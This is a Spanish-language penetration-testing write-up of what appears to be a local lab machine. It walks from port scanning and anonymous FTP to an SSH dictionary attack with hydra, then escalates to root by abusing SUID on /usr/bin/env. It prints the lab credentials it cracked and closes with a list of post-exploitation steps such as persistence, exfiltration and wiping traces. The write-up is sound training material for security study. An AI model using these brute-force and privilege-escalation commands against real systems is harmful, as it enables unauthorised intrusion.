# Informe de Evaluación de Seguridad – Escenario de Pentesting

## 1. Comprobación de Conectividad

```bash
ping 172.17.0.2
```

---

## 2. Escaneo de Puertos Abiertos

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2
```

✅ **Puertos abiertos detectados:**
- **21** (FTP)
- **22** (SSH)
- **80** (HTTP)

---

## 3. Detección de Versiones de Servicios

```bash
nmap -p21,22,80 -sCV 172.17.0.2
```

**Resultados:**

| Puerto | Servicio | Versión |
|--------|----------|---------|
| 21/tcp | FTP      | vsftpd 3.0.5 |
| 22/tcp | SSH      | OpenSSH 8.9p1 (Ubuntu) |
| 80/tcp | HTTP     | Apache httpd 2.4.52 (Ubuntu) |

---

## 4. Acceso al Servicio FTP (Modo Anónimo)

```bash
ftp 172.17.0.2
```

📥 **Acceso concedido (anónimo):** `230 Login successful`

**Archivos encontrados:**
```
-rw-r--r--    1 0 0   667 Jun 18 2024 chat-gonza.txt
-rw-r--r--    1 0 0   315 Jun 18 2024 pendientes.txt
```

📄 **Contenido útil de `pendientes.txt`:**

> "Cambiar algunas configuraciones de mi equipo, creo que tengo ciertos permisos habilitados que no son del todo seguros..."

---

## 5. Análisis de Directorios con HTTP

```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirb/common.txt
```

**Parámetros utilizados:**

| Parámetro | Explicación |
|----------|-------------|
| `gobuster` | Herramienta de fuerza bruta para descubrir rutas ocultas |
| `dir`     | Modo de búsqueda de directorios |
| `-u`      | URL del objetivo |
| `-w`      | Ruta al diccionario de palabras |

📂 **Rutas encontradas:**

```
/.hta              (403)
/.htpasswd         (403)
/.htaccess         (403)
/backup            (301) → http://172.17.0.2/backup/
/important         (301) → http://172.17.0.2/important/
/index.html        (200)
/server-status     (403)
```

📄 **Contenido destacado:**
- En `important.md`: un manifiesto (contenido no detallado).
- En `backup.txt`:  
  > **Usuario común en servicios:** `russoski`  
  > _(¡Se recomienda cambiar pronto!)_

---

## 6. Ataque de Fuerza Bruta a SSH

**Intentos iniciales fallidos** con clave vacía.  
Se procede con ataque por diccionario:

```bash
hydra -l russoski -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
```

**Parámetros:**

| Parámetro | Explicación |
|----------|-------------|
| `-l russoski` | Usuario objetivo |
| `-P rockyou.txt` | Lista de contraseñas |
| `ssh://` | Protocolo y dirección objetivo |

🔓 **Contraseña descubierta:** `iloveme`

---

## 7. Acceso por SSH

```bash
ssh russoski@172.17.0.2
```

✅ Acceso exitoso con credenciales encontradas.

---

## 8. Búsqueda de Archivos con Permisos Especiales (SUID)

```bash
find / -perm -4000 -type f 2>/dev/null
```

📍 Archivo interesante encontrado:

```
/usr/bin/env
```

---

## 9. Escalada de Privilegios a root

```bash
/usr/bin/env /bin/sh -p
```

🛡️ **Shell con privilegios de root obtenida.**

---

## 10. Post-Explotación

📌 Acciones posibles tras obtener acceso como **root**:

- ✅ Establecer persistencia
- 👤 Crear usuario oculto
- 🔐 Añadir clave pública SSH
- 📦 Exfiltrar información sensible
- 🌐 Explorar red interna
- 🔀 Pivoting hacia otras máquinas
- 🧹 Eliminar huellas
- 💣 Destruir el sistema (⚠️ no recomendado)
